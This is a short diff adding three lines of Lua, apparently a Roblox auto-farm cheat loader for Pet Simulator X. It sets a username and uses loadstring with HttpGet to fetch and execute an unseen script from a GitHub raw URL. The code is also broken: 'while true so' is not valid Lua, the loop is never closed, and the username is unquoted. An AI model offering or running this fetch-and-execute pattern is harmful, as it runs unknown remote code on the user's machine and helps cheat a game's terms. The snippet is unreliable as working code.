@@ -1,0 +1,3 @@
+while true so
+_G.Username = xXDarkGam3rYTXx
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua", true))()
